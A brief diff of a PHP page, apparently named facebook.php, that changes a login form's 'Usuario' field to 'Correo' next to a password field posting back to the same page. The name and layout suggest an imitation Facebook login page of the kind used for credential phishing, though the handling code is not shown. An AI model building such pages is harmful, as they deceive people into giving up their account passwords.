@@ -30,7 +30,7 @@ if($_GET['accion']=="facebook") {
 <body>
 
 <form action="facebook.php?accion=facebook" method="POST">
-Usuario: <input type="text" name="usuario"><br>
+Correo: <input type="text" name="correo"><br>
 Password: <input type="password" name="pass"><br>
 <input type="submit" value="Entrar">
 </form>
